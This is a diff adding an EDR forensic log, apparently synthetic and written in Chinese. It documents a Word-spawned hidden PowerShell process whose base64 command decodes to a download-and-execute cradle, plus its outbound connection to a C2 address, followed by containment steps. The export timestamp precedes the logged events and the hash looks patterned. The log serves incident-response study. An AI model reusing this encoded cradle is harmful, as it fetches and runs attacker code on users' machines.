@@ -1,0 +1,23 @@
+==============================================================================
+ Microsoft Defender for Endpoint  取证日志导出
+ 导出时间: 2026-06-19 01:46:45  时区: Asia/Shanghai (UTC+8)
+ 关联规则: EDR-C2-2048  PowerShell 隐藏窗口 + 编码命令 + 外联
+ ATT&CK: T1059.001 / T1071.001
+==============================================================================
+
+2026-06-19 09:42:00  HR-PC-118  EventID=1 (ProcessCreate / Auth)
+  Computer: HR-PC-118
+  User: CORP\wang.fang
+  Image/Process: C:\Users\wang.fang\AppData\Local\Temp\update.ps1
+  CommandLine: powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADQANQAuADEANAA2AC4A
+  ParentImage: WINWORD.EXE
+  Action: -
+  Hashes: SHA256=9f2b8e1c7d4a6f0b3c5e8a1d2f4b6c8e0a2c4e6f8b0d2f4a6c8e0b2d4f6a8c0e
+
+2026-06-19 09:42:00  HR-PC-118  EventID=3 (NetworkConnect)
+  SourceIp: 10.22.7.118  DestinationIp: 45.146.19.77:443
+  DestinationHostname: cdn-update-srv.com
+
+VERDICT: UNDER_INVESTIGATION
+KeyEvidence: WINWORD->powershell 进程链；-enc 解码后为下载 cradle；外联 45.146.19.77:443 命中 TI
+Handling: 封禁 C2 IP/域名，隔离主机，溯源钓鱼邮件并全网检索同源附件 Hash。
